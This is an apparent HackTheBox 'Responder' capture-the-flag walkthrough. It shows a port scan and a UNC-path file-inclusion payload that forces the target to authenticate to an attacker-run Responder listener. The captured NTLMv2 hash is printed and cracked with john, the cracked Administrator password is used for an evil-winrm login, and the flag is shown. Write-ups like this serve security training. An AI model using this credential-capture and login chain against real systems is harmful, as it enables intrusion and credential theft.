# [HackTheBox] [Responder]: [Enumeration], [Foothold]

**Target:** [Responder] | **OS:** Windows | **Difficulty:** Super Easy  
**Attack Vector:** [Enumeration -> Foothold]

---

## 1. Enumeration

```bash
sudo nmap -p- -sS ---min-rate 5000 -T3 10.129.111.103
```

`PORT     STATE SERVICE
80/tcp   open  http
5985/tcp open  wsman
7680/tcp open  pando-pub`

After checking the http service, we cant enter but we have a direction so lets solve the DNS

```bash
sudo nvim /etc/hosts
```

So, the web have LFI, RFI and SMB-based vulnerabilitys

Lets use responder to have it listeting i did it with

```shell
sudo python3 Responder.py -I tun0 -v 
```

`http://unika.htb/?page=\\10.10.15.68\somefile` on the web

`[SMB] NTLMv2-SSP Client   : 10.129.111.103
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:a8a76442a39020f4:D13989969FA8D2AD0B6B089B58A1EB26:0101000000000000006D01921B78DD01928E264F608E69F900000000020008004E004F004500460001001E00570049004E002D0038003200310037003400360037005800480051005A0004003400570049004E002D0038003200310037003400360037005800480051005A002E004E004F00450046002E004C004F00430041004C00030014004E004F00450046002E004C004F00430041004C00050014004E004F00450046002E004C004F00430041004C0007000800006D01921B78DD0106000400020000000800300030000000000000000100000000200000B52FF20485660D6524CE6B488B0F45656D71043BDBE945481AAC3BB779B300280A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00360038000000000000000000`

```shell
echo 'Administrator::RESPONDER:a8a76442a39020f4:D13989969FA8D2AD0B6B089B58A1EB26:0101000000000000006D01921B78DD01928E264F608E69F900000000020008004E004F004500460001001E00570049004E002D0038003200310037003400360037005800480051005A0004003400570049004E002D0038003200310037003400360037005800480051005A002E004E004F00450046002E004C004F00430041004C00030014004E004F00450046002E004C004F00430041004C00050014004E004F00450046002E004C004F00430041004C0007000800006D01921B78DD0106000400020000000800300030000000000000000100000000200000B52FF20485660D6524CE6B488B0F45656D71043BDBE945481AAC3BB779B300280A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00360038000000000000000000' > admin.hash

➜ john admin.hash --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
Warning: detected hash type "netntlmv2", but the string is also recognized as "ntlmv2-opencl"
Use the "--format=ntlmv2-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
badminton        (Administrator)
1g 0:00:00:00 DONE (2026-11-19 11:51) 100.0g/s 409600p/s 409600c/s 409600C/s 123456..oooooo
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

We got the password, which is `badminton` for `Administrator`

## 2. Foothold

```shell
evil-winrm -u administrator -p badminton -i 10.129.111.103
```

We got the sell

## 3. Flag
```shell
*Evil-WinRM* PS C:\Users\Administrator> cd ..
*Evil-WinRM* PS C:\Users> ls


    Directory: C:\Users


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          3/9/2022   5:35 PM                Administrator
d-----          3/9/2022   5:33 PM                mike
d-r---        10/10/2020  12:37 PM                Public


*Evil-WinRM* PS C:\Users> cd mike
*Evil-WinRM* PS C:\Users\mike> ls


    Directory: C:\Users\mike


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         3/10/2022   4:51 AM                Desktop


*Evil-WinRM* PS C:\Users\mike> cd Desktop
*Evil-WinRM* PS C:\Users\mike\Desktop> ls


    Directory: C:\Users\mike\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         3/10/2022   4:50 AM             32 flag.txt


*Evil-WinRM* PS C:\Users\mike\Desktop> cat flag.txt
ea81b7afddd03efaa0945333ed147fac
```
